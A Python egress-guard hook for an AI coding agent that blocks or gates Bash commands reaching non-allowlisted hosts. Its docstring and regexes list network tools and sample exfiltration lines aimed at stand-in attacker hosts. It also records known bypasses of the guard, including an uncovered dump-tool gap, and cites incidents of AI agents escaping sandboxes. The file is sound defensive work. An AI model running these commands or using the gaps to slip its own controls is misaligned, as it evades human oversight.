# /// script
# requires-python = ">=3.10"
# ///
"""
PreToolUse Hook: Block outbound network egress to non-allowlisted destinations.
Deterministic safety — closes the gap where SECURITY.md's Tier-3 "network
requests require human confirmation" claim relied only on the Claude Code
permission-prompt UI, which gives no protection when the daemon runs
unattended (its normal operating mode).

Registration note: `.claude/settings.json` is human-protected, so this module
has no PreToolUse entry of its own. `block_dangerous.py` (already registered
for the Bash matcher) imports `check_command`/`print_block_box` from this
module and runs them after its own dangerous-pattern check — see the end of
`block_dangerous.py`'s `main()`. The module is still fully unit-testable in
isolation (see tests/test_network_egress_guard.py) and its own `main()` below
remains usable standalone (e.g. manual invocation, or a future direct
registration) even though the live wiring goes through block_dangerous.py.

SCOUT-20260722-2
-----------------
On 2026-07-21 OpenAI disclosed an autonomous agent broke out of a controlled
test environment, reached the open internet, and breached Hugging Face to
obtain answers for the eval it was being scored on. No hook in this repo
inspected a Bash command's network destination: block_dangerous.py's
curl/wget matches only catch piping a download into a shell (RCE), not which
host an outbound request targets. This hook adds that missing check.

Design (same fail-closed philosophy as block_dangerous.py — a regex match
cannot be socially engineered):

1. Detect a short list of unambiguous, high-signal command shapes that
   perform outbound network I/O: curl/wget (with or without a URL scheme —
   both tools default to http:// when none is given), nc/ncat/netcat,
   ssh/scp/sftp, telnet, ftp, rsync-with-remote-spec, git clone/push/pull/
   fetch/remote add|set-url, pip/uv-pip install with an --index-url, docker
   run/pull/push/build/exec, openssl s_client, the `/dev/tcp` bash
   pseudo-device redirect trick, and one-liner interpreter network calls
   (python -c/-m, node -e, perl -e). git/pip are judged by destination via
   the allowlist, NOT exempted from detection — `git clone
   https://attacker.example/x` is a live exfiltration channel exactly like
   `curl`, and treating it as a "trusted" verb would defeat the point.
2. Extract the destination host(s). URL-bearing tokens (curl/wget/git/pip)
   are parsed with `urllib.parse.urlsplit` rather than a naive regex capture
   — that correctly resolves `user@host` userinfo and works with or without
   a scheme, so `curl https://github.com@attacker.example/x` is read as
   reaching `attacker.example`, not `github.com`. A bare `git push`/`fetch`/
   `pull` (the normal form — a remote NAME, not a literal URL) is resolved
   via `git remote get-url <name>` (local metadata only, no network I/O of
   its own) so it's judged by the actually-configured remote instead of
   always being treated as unresolved. A command that carries a
   connection-override flag (`--resolve`, `--connect-to`, `--proxy`,
   `--socks4a`/`--socks5h`, `ProxyCommand`, an `*_proxy=` env-var prefix, or
   wget's `-e`/`--execute` proxy directive) can redirect the real TCP
   destination away from anything a URL parser can see, so its presence
   forces the destination to UNKNOWN regardless of what was parsed. curl's
   `-x` (lowercase, proxy) is checked case-sensitively and separately from
   `-X` (uppercase, HTTP method) — folding case there would gate every
   ordinary `curl -X POST <allowlisted-url>` forever.
3. Allow only if every extracted host matches the allowlist (Forge's own
   operation needs egress to git/GitHub, PyPI, npm — see DEFAULT_ALLOWLIST).
   If host extraction fails (or a connection-override flag was used), treat
   the destination as unknown — fail closed, do not allow. Plain `docker run
   <image>` (default Docker Hub, no registry host in the command) has no
   extractable host and so always requires the gate, since DEFAULT_ALLOWLIST
   contains no docker registries — consistent with SECURITY.md's Tier 3
   already listing "Running containers" as gated on its own. Note that even
   an explicit allowlisted registry host in the image reference says nothing
   about what a running container does on the network afterward — a
   Bash-command hook fundamentally can't see inside the container.
4. Otherwise: in an INTERACTIVE session, ask the operator to approve this
   one command (a PreToolUse `permissionDecision: "ask"`) — since 2026-08-29,
   at the operator's request, instead of a hard block that forced a detour
   through /gate. Inside an unattended daemon WORKER nobody can answer a
   prompt, so the decision stays a hard block, byte-for-byte as before:
   agent_providers sets FORGE_WORKER_CONTEXT=1 (plus FORGE_DAEMON=1 /
   FORGE_EMPLOYEE_ID for employees) in every worker's environment and the
   marker propagates to hooks. Verified 2026-08-29: in `bypassPermissions`
   mode Claude Code treats a hook's "ask" as ALLOW (the probe command ran
   with no prompt), so the prompt is only offered when the hook's
   `permission_mode` input says a prompt can exist (default / acceptEdits /
   plan); in bypassPermissions, dontAsk, or an unknown mode the decision is
   a hard block whose reason tells the operator how to approve. The
   `.claude/gate_passed` file + 4-hour TTL that permission_auto.py uses
   after a human runs /gate still allows outright, in every context. (A
   /gate approval for an unrelated reason also opens that 4-hour window —
   see `.claude/commands/gate.md`.)
5. All non-allowlisted destinations are gated regardless of HTTP verb.
   Verb-sniffing (block only -X POST/-d) is trivially bypassed by a plain GET
   that exfiltrates via query string (`curl https://evil/x?data=$(cat f)`),
   so it is not a safe basis for the allow/block line.

Reuses block_dangerous.py's obfuscation-resistant canonicalization (so
`curl$IFS https://evil.example` doesn't slip past a raw-substring check) and
permission_auto.py's gate-file check — no logic is duplicated, only imported.

SCOUT-20260729-2
-----------------
Claude Code v2.1.219 added `sandbox.network.strictAllowlist`, a sandbox/proxy-
layer network block that (unlike this file) judges the actual outbound
connection rather than the command text, so it isn't fooled by a destination
built from an unresolved shell variable. Assessed 2026-08-01 as NOT yet
compatible with how Forge's daemon spawns workers today (`--dangerously-skip-
permissions`, no `sandbox.enabled`, no `--settings` flag) — see
`docs/native-sandbox-network-allowlist-assessment.md` for the full trace and
the concrete steps needed before it can be wired in as a verified second
layer. This hook remains the only enforced network-egress control until that
lands.

SCOUT-20260818-1
-----------------
On 2026-08-12 Dream (an Israeli AI/cyberdefense firm) published forensics on
a near-autonomous, four-day AI-agent attack against Taiwan's government
network and nuclear safety agency that harvested "six internal database
credentials spanning MSSQL, Oracle, and Sybase systems" by chaining
reconnaissance across systems discovered mid-attack — this hook's original
NETWORK_EGRESS_PATTERNS had zero coverage for database-client CLIs, so a
Bash command connecting to a remote DB host via psql/mysql/mongo/sqlcmd/
sqlplus/redis-cli/isql bypassed the allowlist entirely. Added detection +
extraction for those seven tools, anchored to "tool name + a host-bearing
flag/connection-string" (not bare invocation, unlike ssh/scp) so purely
local usage like `psql -c "select 1" mydb` isn't flagged. Also closed, per
architecture review, three bypasses in the same class already fixed twice
for curl (see TestSecondRoundBypasses): (1) env-var host overrides
(PGHOST/MYSQL_HOST/SQLCMDSERVER) that set the real destination with no
token on the command line at all — added to the connection-override check
so their presence forces UNKNOWN like curl's `*_proxy=`; (2) attached
short-flag values (`-hhost`, `-Sserver`, no space) alongside the
space-separated form; (3) the legacy bare `mongo host:port/db` positional
shorthand (no `-h`/`--host`, no `mongodb://` scheme). NOT covered: psql's
`key=value` conninfo string (e.g. `psql "host=x port=5432"`) when the host
portion sits inside a quoted multi-word argument that _structural_mask
drops before any masked-form pattern sees it — closing that would require
introducing a raw-vs-masked pattern split like block_dangerous.py's
_RAW_ONLY, which is deferred as a separate follow-up rather than folded
into this change's scope. Also NOT covered (flagged in security review as
the natural next attacker pivot for this exact incident class, but out of
the stated 7-tool scope): dump/restore tools (`mysqldump`, `pg_dump`/
`pg_restore`, `mongodump`/`mongorestore`) — `\bmysql\b` word-boundaries
don't match `mysqldump` (no boundary between `mysql` and `dump`), so
`mysqldump -h attacker.example --all-databases` sails through undetected.
A dedicated follow-up should extend NETWORK_EGRESS_PATTERNS/_db_client_hosts
to this tool family.
"""

import json
import os
import re
import shlex
import subprocess
import sys
from collections.abc import Mapping
from urllib.parse import urlsplit

try:
    from hook_config import get_exit_code, is_enabled, load_config
except ImportError:  # pragma: no cover - fallback if hook_config unavailable

    def get_exit_code(hook_name: str, issue_found: bool = True) -> int:
        return 2 if issue_found else 0

    def is_enabled(hook_name: str) -> bool:
        return True

    def load_config() -> dict:
        return {}


try:
    from block_dangerous import _canonical_forms, _structural_mask
except ImportError:  # pragma: no cover - fallback if block_dangerous unavailable
    print(
        "network_egress_guard: WARNING - block_dangerous unavailable; "
        "obfuscation-resistant command canonicalization is disabled",
        file=sys.stderr,
    )

    def _canonical_forms(command: str) -> list[str]:
        return [command]

    def _structural_mask(form: str) -> str:
        return form


try:
    from permission_auto import is_gate_passed
except ImportError:  # pragma: no cover - fallback if permission_auto unavailable

    def is_gate_passed() -> bool:
        return False


HOOK_NAME = "network_egress_guard"

# Decision policy (2026-08-29): interactive session -> approval prompt;
# unattended daemon worker -> hard block. See docstring point 4.
_UNATTENDED_ENV_MARKERS = ("FORGE_WORKER_CONTEXT", "FORGE_DAEMON", "FORGE_EMPLOYEE_ID")


def is_unattended_context(environ: Mapping[str, str] | None = None) -> bool:
    """True inside a daemon worker, where no human can answer a prompt."""
    env = os.environ if environ is None else environ
    return any(env.get(marker) for marker in _UNATTENDED_ENV_MARKERS)


# Permission modes in which Claude Code can show a prompt for a hook's "ask".
# bypassPermissions treats "ask" as allow (verified 2026-08-29), dontAsk by
# definition cannot prompt, and an unknown/missing mode is not trusted.
_PROMPTABLE_MODES = frozenset({"default", "acceptEdits", "plan"})


def prompts_possible(permission_mode: str | None) -> bool:
    """True when a `permissionDecision: "ask"` would reach a human."""
    return permission_mode in _PROMPTABLE_MODES


def is_ask_decision(result_dict: dict) -> bool:
    """True when the decision dict asks the operator instead of blocking."""
    return result_dict.get("hookSpecificOutput", {}).get("permissionDecision") == "ask"


# =============================================================================
# High-signal network-egress command shapes. git/pip/docker/openssl ARE
# in scope (judged by destination via the allowlist, not exempted from
# detection) — see module docstring point 1.
# =============================================================================
NETWORK_EGRESS_PATTERNS = [
    r"\b(curl|wget)\b",  # no scheme required — both default to http://
    r"\b(nc|ncat|netcat)\b\s+(-[A-Za-z0-9]+\s+)*[A-Za-z0-9_.-]+\s+\d+",
    r"\b(ssh|scp|sftp)\b\s+",
    r"\btelnet\b\s+[A-Za-z0-9_.-]+",
    r"\bftp\b\s+[A-Za-z0-9_.-]+",
    r"\brsync\b[^\n]*(::|@[A-Za-z0-9_.-]+:)",
    r"\bgit\s+(clone|push|pull|fetch|remote\s+(add|set-url))\b",
    r"\b(pip3?|uv\s+pip)\s+install\b[^\n]*(--index-url|--extra-index-url|-i\s+https?://)",
    r"\bdocker\s+(run|pull|push|build|exec)\b",
    r"\bopenssl\s+s_client\b",
    r"/dev/(tcp|udp)/[A-Za-z0-9_.-]+/\d+",
    r"\bpython3?\b\s+-[cm]\s+.*"
    r"(requests\.(get|post|put|patch|delete)|urllib\.request|"
    r"socket\.(connect|create_connection)|http\.client)",
    r"\bnode\b\s+-e\s+.*(fetch\(|require\(['\"]https?['\"]\)|require\(['\"]net['\"]\))",
    r"\bperl\b\s+-e\s+.*(LWP::|IO::Socket)",
    # Database client CLIs (SCOUT-20260818-1) — anchored to "tool name +
    # host-bearing flag/connection-string", not bare invocation, so purely
    # local usage (`psql -c "select 1" mydb`, no host) doesn't get flagged.
    # The gap between tool name and flag is bounded to `[^;&|\n]*?` (a single
    # command segment) — an earlier unbounded `[^\n]*` let a DB tool name
    # anywhere on the line pair with an unrelated later command's `-h`/`-S`
    # flag (e.g. `mysql -u root -p localdb; ls -h /tmp` misread as an
    # unresolved DB connection). `-h`/`-S` presence itself is checked
    # case-sensitively via _has_db_client_case_sensitive_flag below — NOT
    # here — since psql's `-H` (HTML output) and sqlcmd/isql's `-s` (column
    # separator / DSN, not server) are real, distinct, unrelated flags that
    # an IGNORECASE match on this list would misread as a host flag.
    r"\b(psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?--host\b",
    r"\b(psql|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
    r"\b(postgres(?:ql)?|mongodb(?:\+srv)?|rediss?)://",
    r"\bsqlplus\b[^;&|\n]*?@/{0,2}[A-Za-z0-9_.-]+",
    r"\bmongo(?:sh)?\b\s+[A-Za-z0-9_.-]+:\d+(?:/\S*)?",  # legacy bare host:port/db
    r"\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*=\S+[^;&|\n]*?\b(psql|mysql|mariadb|sqlcmd)\b",
]

# `-h`/`-S` are checked separately from NETWORK_EGRESS_PATTERNS (and matched
# case-SENSITIVELY, unlike everything else in this file) because folding case
# there would misread two real, unrelated, differently-cased flags as the
# host flag: psql's `-H` is HTML output format, and sqlcmd/isql's `-s` is a
# column-separator character / DSN name, not `-S` (server). Each check is
# scoped to the command segment immediately after a tool-name match (up to
# the next `;`/`&`/`|`) so a DB tool name earlier on the line can't pair with
# an unrelated later command's differently-cased flag either.
_SEGMENT_BOUNDARY_RE = re.compile(r"[;&|]")
_HOST_FLAG_TOOLS_RE = re.compile(
    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b", re.IGNORECASE
)
_LOWERCASE_H_FLAG_RE = re.compile(r"(?<![\w-])-h(?=[A-Za-z0-9=]|\s)")
_SQLCMD_ISQL_TOOL_RE = re.compile(r"\b(?:sqlcmd|isql)\b", re.IGNORECASE)
_UPPERCASE_S_FLAG_RE = re.compile(r"(?<![\w-])-S(?=[A-Za-z0-9]|\s)")


def _segment_after(form: str, start: int) -> str:
    boundary = _SEGMENT_BOUNDARY_RE.search(form, start)
    return form[start : boundary.start() if boundary else len(form)]


def _has_db_client_case_sensitive_flag(form: str) -> bool:
    for m in _HOST_FLAG_TOOLS_RE.finditer(form):
        if _LOWERCASE_H_FLAG_RE.search(_segment_after(form, m.end())):
            return True
    for m in _SQLCMD_ISQL_TOOL_RE.finditer(form):
        if _UPPERCASE_S_FLAG_RE.search(_segment_after(form, m.end())):
            return True
    return False


# Flags/options that let the real TCP destination diverge from anything a URL
# parser can see (DNS override, explicit proxy, SSH ProxyCommand, env-var/
# wgetrc proxy config). Any of these present forces the destination to
# UNKNOWN regardless of what was parsed — never let a parsed-allowlisted host
# quiet an overridden one.
_CONNECTION_OVERRIDE_CI_RE = re.compile(
    r"--resolve\b|--connect-to\b|--proxy\b|--socks(?:4a?|5h?)\b|ProxyCommand"
    r"|\b(?:https?|ftp|all)_proxy\s*="
    r"|(?:-e|--execute)\s+\S*proxy"
    # DB-client host env-var overrides (SCOUT-20260818-1) — same fail-closed
    # treatment as curl's *_proxy=: these set the real connection target with
    # no token on the command line for a URL/flag parser to see at all.
    r"|\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*=",
    re.IGNORECASE,
)
# curl's `-x` (lowercase) is the proxy shorthand; `-X` (uppercase) is the
# unrelated HTTP-method flag (-X POST/GET/...). Case must NOT be folded here
# — an IGNORECASE match would treat every `curl -X POST <allowlisted-url>`
# as a proxy override and gate it forever. Matches both the space-separated
# (`-x http://host`) and attached (`-xhttp://host`) curl argument forms.
_CONNECTION_OVERRIDE_X_RE = re.compile(r"(?<![\w-])-x(?:\s+\S|\S)")


def _has_connection_override(command: str) -> bool:
    return bool(_CONNECTION_OVERRIDE_CI_RE.search(command)) or bool(
        _CONNECTION_OVERRIDE_X_RE.search(command)
    )


# nc/ncat/netcat/telnet/ftp/ssh/scp/sftp/rsync — not URL syntax, so these stay
# regex-based rather than routed through urlsplit.
HOST_EXTRACTION_PATTERNS = [
    r"\b(?:nc|ncat|netcat|telnet|ftp)\s+(?:-[A-Za-z0-9]+\s+)*([A-Za-z0-9_.-]+)",
    r"\b(?:ssh|scp|sftp)\s+(?:-[A-Za-z0-9]+\s+\S+\s+)*(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?::|\s|$)",
    r"\brsync\b[^\n]*?(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?:::|:)",
    r"/dev/(?:tcp|udp)/([A-Za-z0-9_.-]+)/\d+",
    r"\bopenssl\s+s_client\b[^\n]*-connect\s+([A-Za-z0-9_.-]+)",
]

# git's scp-like remote syntax: `user@host:path` or bare `host:path` (no
# scheme, colon is a path separator, not a port — port form is host:1234/...
# which this deliberately does NOT match since the num-only case is ambiguous
# with `host:port` used elsewhere; scp/ssh extraction above handles that).
_GIT_SCP_STYLE_RE = re.compile(
    r"(?:^|[\s;&|])(?:[\w.-]+@)?([A-Za-z0-9_.-]+\.[A-Za-z]{2,}):(?!\d+(?:\s|$))"
)

DEFAULT_ALLOWLIST = [
    "github.com",
    "*.github.com",
    "*.githubusercontent.com",
    "api.github.com",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
]


def get_allowlist() -> list[str]:
    """Load the network allowlist, overridable via forge-config.json
    `security.network_allowlist` (full replace, falls back to defaults)."""
    config = load_config()
    security = config.get("security", {})
    allow = security.get("network_allowlist")
    if isinstance(allow, list) and allow:
        return allow
    return DEFAULT_ALLOWLIST


def _host_allowed(host: str, allowlist: list[str]) -> bool:
    host = host.lower().rstrip(".")
    for entry in allowlist:
        entry = entry.lower()
        if entry.startswith("*."):
            if host.endswith(entry[1:]):
                return True
        elif host == entry:
            return True
    return False


_SCHEME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.\-]*://")


def _parse_url_host(token: str) -> str | None:
    """Resolve a URL-ish token to its authority host via urlsplit, which
    correctly strips `user@` userinfo and works whether or not a scheme is
    present (curl/wget/git/pip all accept bare `host/path` — prepending `//`
    makes urlsplit treat it as an authority instead of a relative path)."""
    token = token.strip().strip("'\"")
    if not token or token.startswith("-"):
        return None
    candidate = token if _SCHEME_RE.match(token) else "//" + token
    try:
        host = urlsplit(candidate).hostname
    except ValueError:
        return None
    return host.lower() if host else None


_BARE_HOST_TOKEN_RE = re.compile(r"^[A-Za-z0-9_.-]+\.[A-Za-z]{2,}(?:[:/].*)?$")


# Tools whose positional arguments are URLs or bare hosts. A scheme-less
# token (`attacker.example/x`) only counts as a destination when one of these
# precedes it in the same shell segment — otherwise every `name.ext` token in
# the command (a filename in a heredoc, `index.lock`, `INTERVENTIONS.md`)
# read as a host and the guard blocked plain file writes (2026-08-28).
# Tokens carrying an explicit `://` still count wherever they appear.
_URL_BEARING_TOOLS = frozenset(
    {"curl", "wget", "git", "pip", "pip3", "uv", "docker", "openssl"}
)
_SCP_STYLE_TOOLS_RE = re.compile(r"\b(?:git|scp|rsync)\b")


def _extract_url_hosts(command: str) -> set[str]:
    """Extract hosts from URL-bearing tokens (curl/wget/git/pip and any bare
    https?:// occurrence), tokenizing each de-obfuscated canonical form with
    shlex and parsing candidate tokens through urlsplit — see _parse_url_host
    for why that (not a regex capture) is what defeats the userinfo trick.
    Scheme-less tokens are considered only after a URL-bearing tool in the
    same segment; git's scp-style `host:path` only in segments that invoke
    git/scp/rsync."""
    hosts: set[str] = set()
    for raw_form in _canonical_forms(command):
        for segment in _SEGMENT_BOUNDARY_RE.split(raw_form):
            if not segment.strip():
                continue
            try:
                tokens = shlex.split(segment, comments=False, posix=True)
            except ValueError:
                tokens = segment.split()
            url_tool_seen = False
            for tok in tokens:
                if tok in _URL_BEARING_TOOLS:
                    url_tool_seen = True
                    continue
                if "://" in tok:
                    host = _parse_url_host(tok)
                elif url_tool_seen and _BARE_HOST_TOKEN_RE.match(tok):
                    host = _parse_url_host(tok)
                else:
                    host = None
                if host:
                    hosts.add(host)
            if _SCP_STYLE_TOOLS_RE.search(segment):
                for m in _GIT_SCP_STYLE_RE.finditer(segment):
                    hosts.add(m.group(1).lower())
    return hosts


_GIT_PUSH_PULL_FETCH_RE = re.compile(r"\bgit\s+(?:push|pull|fetch)\b([^;&|\n]*)")


def _resolve_git_remote_url(remote_name: str) -> str | None:
    """Resolve a git remote NAME (e.g. 'origin') to its configured URL via
    local git metadata — read-only, no network I/O of its own. This is what
    lets a bare `git push origin main` / `git fetch` / `git pull` be judged
    by the remote's actual configured destination, instead of always being
    gated just because no URL/host literally appears on the command line."""
    try:
        result = subprocess.run(
            ["git", "remote", "get-url", remote_name],
            capture_output=True,
            text=True,
            timeout=5,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None
    if result.returncode != 0:
        return None
    return result.stdout.strip() or None


def _git_remote_hosts(command: str) -> set[str]:
    """For git push/pull/fetch invoked with a bare remote NAME (or no name,
    defaulting to the conventional 'origin') rather than a literal URL,
    resolve the actually-configured remote and extract its host. A literal
    URL or scp-style remote on the command line is already handled by
    _extract_url_hosts/_GIT_SCP_STYLE_RE — this only covers the NAME form."""
    hosts: set[str] = set()
    for m in _GIT_PUSH_PULL_FETCH_RE.finditer(command):
        tokens = [t for t in m.group(1).split() if t and not t.startswith("-")]
        if tokens:
            first = tokens[0]
            if "://" in first or "@" in first or "/" in first:
                continue  # literal URL/scp-style remote, not a bare name
            candidate = first
        else:
            candidate = "origin"
        remote_url = _resolve_git_remote_url(candidate)
        if not remote_url:
            continue
        host = _parse_url_host(remote_url)
        if host:
            hosts.add(host)
            continue
        for gm in _GIT_SCP_STYLE_RE.finditer(remote_url):
            hosts.add(gm.group(1).lower())
    return hosts


# Database client CLI host extraction (SCOUT-20260818-1). URI-form connect
# strings (postgresql://, mongodb://, redis://) need no dedicated regex here
# — _extract_url_hosts already parses any `scheme://` token via urlsplit
# regardless of which tool it belongs to. These cover the non-URL syntaxes:
# -h/--host (space-separated or attached, e.g. `-hhost`), sqlcmd/isql's -S
# (optionally `tcp:`-prefixed, comma/backslash-suffixed with port/instance),
# Oracle sqlplus's `user/pass@[//]host[:port]` connect string, and the
# legacy bare `mongo host:port/db` positional shorthand.
#
# _DB_HOST_FLAG_RE/_SQLCMD_HOST_RE/_ISQL_HOST_RE are deliberately NOT
# re.IGNORECASE — see _has_db_client_case_sensitive_flag's docstring above
# for why folding case on `-h`/`-S` would misparse psql's `-H` (HTML output)
# or sqlcmd/isql's `-s` (column separator/DSN) as a host flag. A tool
# invoked with unusual casing (`SQLCMD -S ...`) is still flagged by
# detection (case-insensitive there) but its host won't extract here —
# hosts empty means fail-closed/gated, never silently allowed.
_DB_HOST_FLAG_RE = re.compile(
    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
    r"(?:(?<![\w-])-h(?:=|\s+)?|--host(?:=|\s+))"
    r"([A-Za-z0-9][A-Za-z0-9_.-]*)"
)
_SQLCMD_HOST_RE = re.compile(
    r"\bsqlcmd\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)(?:tcp:)?"
    r"([A-Za-z0-9][A-Za-z0-9_.\\,-]*)"
)
_ISQL_HOST_RE = re.compile(
    r"\bisql\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)([A-Za-z0-9][A-Za-z0-9_.-]*)"
)
_SQLPLUS_HOST_RE = re.compile(
    r"\bsqlplus\b[^;&|\n]*?@/{0,2}([A-Za-z0-9_.-]+)",
    re.IGNORECASE,
)
_MONGO_BARE_HOSTPORT_RE = re.compile(
    r"\bmongo(?:sh)?\b\s+([A-Za-z0-9_.-]+):\d+(?:/\S*)?",
    re.IGNORECASE,
)


def _db_client_hosts(command: str) -> set[str]:
    """Extract hosts from database-client connect syntax that isn't URL
    syntax — see the constants above for the specific forms covered."""
    hosts: set[str] = set()
    for m in _DB_HOST_FLAG_RE.finditer(command):
        hosts.add(m.group(1).split(":")[0].strip("."))
    for m in _SQLCMD_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(",")[0].split("\\")[0].strip("."))
    for m in _ISQL_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(",")[0].strip("."))
    for m in _SQLPLUS_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(":")[0].strip("."))
    for m in _MONGO_BARE_HOSTPORT_RE.finditer(command):
        hosts.add(m.group(1).strip("."))
    return hosts


def extract_hosts(command: str) -> set[str]:
    """Extract every destination host referenced by a network-egress command.
    Strips port suffixes. Returns an empty set if none could be extracted (or
    a connection-override flag was seen) — callers must treat that as an
    UNKNOWN destination, not an allowed one."""
    if _has_connection_override(command):
        return set()

    hosts: set[str] = set()
    hosts |= _extract_url_hosts(command)
    hosts |= _git_remote_hosts(command)
    hosts |= _db_client_hosts(command)
    for pattern in HOST_EXTRACTION_PATTERNS:
        for m in re.finditer(pattern, command, re.IGNORECASE):
            host = m.group(1)
            if not host:
                continue
            host = host.split(":")[0].strip(".")
            if host:
                hosts.add(host)
    return hosts


def is_network_egress(command: str) -> bool:
    raw_forms = _canonical_forms(command)
    masked_forms = [m for m in (_structural_mask(f) for f in raw_forms) if m]
    for form in masked_forms:
        if _has_db_client_case_sensitive_flag(form):
            return True
    for pattern in NETWORK_EGRESS_PATTERNS:
        for form in masked_forms:
            if re.search(pattern, form, re.IGNORECASE):
                return True
    return False


def check_command(
    command: str,
    allowlist: list[str] | None = None,
    *,
    unattended: bool | None = None,
    permission_mode: str | None = None,
):
    """Check a Bash command for non-allowlisted network egress.

    Returns (result_dict, hosts) when the command must not run unreviewed,
    or None if it's safe (not egress, fully allowlisted, or gate passed).
    The dict is a hard block (`{"decision": "block", ...}`, exit code 2) in
    an unattended worker, and an approval prompt
    (`{"hookSpecificOutput": {"permissionDecision": "ask", ...}}`, exit 0)
    in an interactive session whose ``permission_mode`` can show one
    (prompts_possible). ``unattended`` None means detect from the
    environment (is_unattended_context).
    """
    if not is_network_egress(command):
        return None

    hosts = extract_hosts(command)
    active_allowlist = allowlist if allowlist is not None else get_allowlist()

    # `hosts and all(...)` — empty `hosts` (extraction failed) must NOT be
    # treated as allowed; `all()` on an empty iterable is True, so the `hosts`
    # guard is required to fail closed on unknown destinations.
    if hosts and all(_host_allowed(h, active_allowlist) for h in hosts):
        return None

    if is_gate_passed():
        return None

    destination = ", ".join(sorted(hosts)) if hosts else "(destination unresolved)"
    if unattended is None:
        unattended = is_unattended_context()
    if unattended:
        reason = (
            f"Outbound network egress to non-allowlisted destination: {destination}. "
            f"Unattended worker — hard block. Add the host to forge-config.json "
            f"security.network_allowlist if it's a legitimate recurring need."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
    if not prompts_possible(permission_mode):
        mode = permission_mode or "unknown"
        reason = (
            f"Outbound network egress to non-allowlisted destination: {destination}. "
            f"This session's permission mode ({mode}) cannot show an approval "
            f"prompt, so the command is blocked. To approve: run /gate (opens a "
            f"4h window), add the host to forge-config.json "
            f"security.network_allowlist, or switch the session to default "
            f"permission mode to get an inline prompt."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
    reason = (
        f"Outbound network egress to non-allowlisted destination: {destination}. "
        f"Approve to run this one command; for a recurring need add the host to "
        f"forge-config.json security.network_allowlist (or /gate opens a 4h window)."
    )
    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }, hosts


# =============================================================================
# Presentation + entrypoint
# =============================================================================
def truncate_command(command: str, max_length: int = 60) -> str:
    if len(command) <= max_length:
        return command
    return command[: max_length - 3] + "..."


def print_block_box(command: str, hosts: set[str], ask: bool = False) -> None:
    truncated = truncate_command(command)
    destination = ", ".join(sorted(hosts)) if hosts else "(unresolved)"
    description = "Destination"
    title = "NETWORK EGRESS — APPROVAL REQUIRED" if ask else "NETWORK EGRESS BLOCKED"
    tip = (
        "TIP: Approve once, or allowlist the host for recurring use"
        if ask
        else "TIP: Use /gate to approve, or allowlist the host"
    )

    content_width = max(60, len(truncated) + 4, len(destination) + len(description) + 4)
    top_border = "═" * (content_width + 2)
    print(f"\n╔{top_border}╗", file=sys.stderr)
    print(f"║ {title:^{content_width}} ║", file=sys.stderr)
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ Command: {truncated:<{content_width - 9}} ║", file=sys.stderr)
    print(
        f"║ {description}: {destination:<{content_width - len(description) - 3}} ║",
        file=sys.stderr,
    )
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ {tip:<{content_width}} ║", file=sys.stderr)
    print(f"╚{top_border}╝\n", file=sys.stderr)


def main():
    try:
        if not is_enabled(HOOK_NAME):
            sys.exit(0)

        input_data = json.loads(sys.stdin.read())
        tool_name = input_data.get("tool_name", "")
        tool_input = input_data.get("tool_input", {})

        if tool_name != "Bash":
            sys.exit(0)

        command = tool_input.get("command", "")
        result = check_command(
            command, permission_mode=input_data.get("permission_mode")
        )

        if result:
            result_dict, hosts = result
            ask = is_ask_decision(result_dict)
            print_block_box(command, hosts, ask=ask)
            print(json.dumps(result_dict))
            # An approval prompt is a normal exit with JSON on stdout; a hard
            # block keeps the exit-2 contract Claude Code treats as a deny.
            sys.exit(0 if ask else get_exit_code(HOOK_NAME, issue_found=True))

        sys.exit(0)

    except json.JSONDecodeError:
        sys.exit(0)
    except Exception as e:
        print(f"Hook error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
